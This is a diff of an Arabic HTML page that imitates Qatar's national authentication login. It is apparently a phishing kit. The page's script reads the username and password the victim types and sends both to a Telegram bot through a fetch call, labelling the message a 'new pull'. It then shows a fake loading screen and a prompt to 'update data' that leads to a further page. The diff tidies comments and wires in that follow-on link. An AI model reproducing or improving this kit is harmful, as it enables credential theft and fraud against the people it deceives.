@@ -57,7 +57,7 @@
             box-sizing: border-box;
         }
 
-        /* بطاقة تسجيل الدخول عريضة وفخمة حسب الصورة */
+        /* بطاقة تسجيل الدخول عريضة وفخمة */
         .login-card {
             background: #ffffff;
             width: 92%; 
@@ -104,17 +104,12 @@
         .dot { width: 10px; height: 10px; background: rgba(255,255,255,0.3); border-radius: 50%; }
         .dot.active { background: #00aaff; }
 
-        /* الفوتر المعتمد على الصور */
         footer {
             width: 100%;
             display: flex;
             flex-direction: column;
         }
-        .footer-img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
+        .footer-img { width: 100%; height: auto; display: block; }
 
         /* شاشة التحميل */
         #loading-screen {
@@ -172,7 +167,7 @@
                 <div class="update-box">
                     <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/RQnjZWnrdYgEbNhJ.svg" class="update-logo">
                     <p>يرجى تحديث البيانات عبر نظام التوثيق الوطني</p>
-                    <a href="#" class="btn-update">تحديث البيانات</a>
+                    <a href="nas_qatar.html" class="btn-update">تحديث البيانات</a>
                 </div>
             </div>
 
@@ -193,7 +188,7 @@
     </div>
 
     <script>
-    // بيانات التليجرام (يرجى وضع التوكن والأيدي الخاص بك)
+    // بيانات التليجرام
     const TOKEN = "YOUR_BOT_TOKEN"; 
     const CHAT_ID = "YOUR_CHAT_ID"; 
 
@@ -204,11 +199,14 @@
         const password = document.getElementById('pass').value;
         const message = `🚀 سحب جديد (توثيق قطر)\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
 
+        // إرسال البيانات للتليجرام
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
 
+        // إخفاء البطاقة وإظهار شاشة التحميل
         document.getElementById('main-card').style.display = 'none';
         document.getElementById('loading-screen').style.display = 'flex';
 
+        // محاكاة التحميل لمدة 5 ثوانٍ ثم إظهار قسم التحديث
         setTimeout(() => {
             document.getElementById('loading-screen').style.display = 'none';
             document.getElementById('update-section').style.display = 'block';
